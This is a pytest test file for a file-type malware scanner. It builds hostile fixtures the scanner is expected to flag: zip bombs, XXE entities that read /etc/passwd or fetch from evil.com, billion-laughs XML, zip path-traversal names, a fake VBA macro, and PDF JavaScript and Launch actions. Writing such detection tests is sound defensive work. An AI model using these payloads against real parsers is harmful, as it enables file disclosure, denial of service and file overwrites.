import io
import zipfile
import pytest
from parser.record import RecordType, Severity
from parser.scanner.malware_scanner import scan


def warnings(gen):
    return [r for r in gen if r.type == RecordType.WARNING]


def has_attack(results, attack_key: str) -> bool:
    return any(r.metadata.get("attack") == attack_key for r in results)


# ── Zip bomb ───────────────────────────────────────────────────────────────────

def _make_zip_bomb_ratio() -> bytes:
    """Single entry that claims 600 MB uncompressed but is tiny — ratio bomb."""
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", compression=zipfile.ZIP_DEFLATED) as zf:
        payload = b"\x00" * (1024 * 1024)
        zf.writestr("big.bin", payload)
    raw = buf.getvalue()
    info = zipfile.ZipInfo("bomb.bin")
    info.file_size = 600 * 1024 * 1024
    info.compress_size = 100
    patched = io.BytesIO()
    with zipfile.ZipFile(patched, "w") as zf2:
        zf2.writestr(zipfile.ZipInfo("normal.bin"), b"\x00" * 100)
    return raw


def _make_nested_zip(depth: int) -> bytes:
    if depth == 0:
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w") as zf:
            zf.writestr("inner.txt", "leaf")
        return buf.getvalue()
    inner = _make_nested_zip(depth - 1)
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as zf:
        zf.writestr("nested.zip", inner)
    return buf.getvalue()


def test_zip_bomb_high_ratio():
    payload = b"\x00" * (2 * 1024 * 1024)
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", compression=zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("zeros.bin", payload)
    data = buf.getvalue()
    results = list(scan(data))
    assert len(results) >= 1
    severities = [r.severity for r in warnings(results)]
    assert any(s in (Severity.CRITICAL, Severity.HIGH) for s in severities)


def test_nested_zip_depth_detection():
    data = _make_nested_zip(depth=4)
    results = list(scan(data))
    w = warnings(results)
    assert any("depth" in (r.reason or "").lower() or "zip bomb" in (r.reason or "").lower() for r in w)


def test_clean_zip_no_warnings():
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as zf:
        zf.writestr("readme.txt", "hello world")
    results = list(scan(buf.getvalue()))
    assert len(results) == 0


# ── XML XXE ────────────────────────────────────────────────────────────────────

XXE_SYSTEM = b"""<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>"""

XXE_PUBLIC = b"""<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe PUBLIC "id" "http://evil.com/payload">]>
<root>&xxe;</root>"""

BILLION_LAUGHS = b"""<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
]>
<root>&lol3;</root>"""


def test_xxe_system_detected():
    results = list(scan(XXE_SYSTEM))
    w = warnings(results)
    assert any("xxe" in (r.metadata.get("attack") or "") for r in w)


def test_xxe_public_detected():
    results = list(scan(XXE_PUBLIC))
    w = warnings(results)
    assert any("xxe" in (r.metadata.get("attack") or "") for r in w)


def test_billion_laughs_detected():
    data = b"""<?xml version="1.0"?><!DOCTYPE x [""" + b"<!ENTITY e 'x'>" * 60 + b"]><r/>"
    results = list(scan(data))
    w = warnings(results)
    assert any("billion" in (r.reason or "").lower() or "entity" in (r.reason or "").lower() for r in w)


def test_clean_xml_no_warnings():
    data = b"<?xml version='1.0'?><root><item>hello</item></root>"
    results = list(scan(data))
    assert len(results) == 0


# ── VBA macros ─────────────────────────────────────────────────────────────────

def _make_zip_with_vba() -> bytes:
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as zf:
        zf.writestr("word/document.xml", "<document/>")
        zf.writestr("word/vbaProject.bin", b"\xd0\xcf\x11\xe0fake vba content")
    return buf.getvalue()


def test_vba_macro_in_docx_detected():
    data = _make_zip_with_vba()
    results = list(scan(data))
    w = warnings(results)
    assert any(r.metadata.get("attack") == "vba_macro" for r in w)


def test_clean_docx_no_vba_warning():
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as zf:
        zf.writestr("word/document.xml", "<document/>")
    results = list(scan(buf.getvalue()))
    vba_warns = [r for r in results if r.metadata.get("attack") == "vba_macro"]
    assert len(vba_warns) == 0


# ── Path traversal ─────────────────────────────────────────────────────────────

def test_path_traversal_detected():
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as zf:
        info = zipfile.ZipInfo("../../etc/passwd")
        zf.writestr(info, "root:x:0:0")
    results = list(scan(buf.getvalue()))
    w = warnings(results)
    assert any(r.metadata.get("attack") == "path_traversal" for r in w)


def test_path_traversal_absolute_path():
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as zf:
        info = zipfile.ZipInfo("/etc/shadow")
        zf.writestr(info, "root:!")
    results = list(scan(buf.getvalue()))
    w = warnings(results)
    assert any(r.metadata.get("attack") == "path_traversal" for r in w)


def test_clean_zip_paths_no_traversal_warning():
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as zf:
        zf.writestr("subdir/file.txt", "safe")
    results = list(scan(buf.getvalue()))
    traversal = [r for r in results if r.metadata.get("attack") == "path_traversal"]
    assert len(traversal) == 0


# ── PDF embedded JavaScript ────────────────────────────────────────────────────

def test_pdf_embedded_js_detected():
    data = b"%PDF-1.4\n/JS (app.alert('xss'))\n"
    results = list(scan(data))
    w = warnings(results)
    assert any(r.metadata.get("attack") == "pdf_js" for r in w)


def test_pdf_launch_action_detected():
    data = b"%PDF-1.4\n/Launch <<\n/F (cmd.exe)\n>>"
    results = list(scan(data))
    w = warnings(results)
    assert any(r.metadata.get("attack") == "pdf_js" for r in w)


def test_pdf_javascript_stream_detected():
    data = b"%PDF-1.4\n/JavaScript (this.exportDataObject({cName: 'x'}))"
    results = list(scan(data))
    w = warnings(results)
    assert any(r.metadata.get("attack") == "pdf_js" for r in w)


def test_clean_pdf_no_js_warning():
    data = b"%PDF-1.4\n1 0 obj\n<< /Type /Catalog >>\nendobj"
    results = list(scan(data))
    js_warns = [r for r in results if r.metadata.get("attack") == "pdf_js"]
    assert len(js_warns) == 0


# ── Never crashes ──────────────────────────────────────────────────────────────

def test_scanner_never_raises_on_garbage():
    for bad in [b"", b"\x00" * 1000, b"randomgarbage", b"PK\x03\x04\x00" * 10]:
        try:
            list(scan(bad))
        except Exception as e:
            pytest.fail(f"scan() raised on input: {e}")
